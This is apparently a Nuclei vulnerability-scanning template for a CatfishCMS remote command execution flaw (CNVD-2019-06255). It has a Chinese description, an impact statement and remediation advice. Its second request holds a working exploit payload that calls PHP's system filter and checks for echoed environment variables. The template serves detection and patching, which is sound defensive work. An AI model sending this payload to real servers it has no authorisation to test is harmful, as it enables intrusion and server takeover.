id: CNVD-2019-06255

info:
  name: CatfishCMS 远程命令执行漏洞（CNVD-2019-06255）
  author: Lark-Lab
  severity: critical
  description: |
    CatfishCMS 在特定路由参数组合下可将用户输入传入危险函数，形成远程命令执行。模板先识别 Catfish CMS，再请求 `s=set&_method=__construct&filter[]=system`，通过系统环境变量回显确认命令执行能力。
  impact: |
    - 攻击者可在 Web 服务权限下执行系统命令，读取或篡改站点文件与数据库配置。
    - 成功利用后可能写入后门、横向移动到内网主机，或造成网站与服务器完全失陷。
  remediation: |
    - 升级 CatfishCMS 至修复版本，移除可触发危险过滤器调用的旧版本代码。
    - 禁止将请求参数作为函数名或过滤器直接调用，并对路由参数做白名单限制。
    - 排查 Web 目录新增脚本、异常进程和可疑外联，必要时轮换数据库与后台凭据。
  reference:
    - https://its401.com/article/yun2diao/91344725
    - https://github.com/xwlrbh/Catfish/issues/4
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  metadata:
    max-request: 2
  tags: cnvd,cnvd2019,rce,catfishcms,vuln

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: word
        internal: true
        words:
          - 'content="Catfish CMS'

  - method: GET
    path:
      - "{{BaseURL}}/s=set&_method=__construct&method=*&filter[]=system"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'OS'
          - 'PATH'
          - 'SHELL'
          - 'USER'
        condition: and

      - type: status
        status:
          - 200
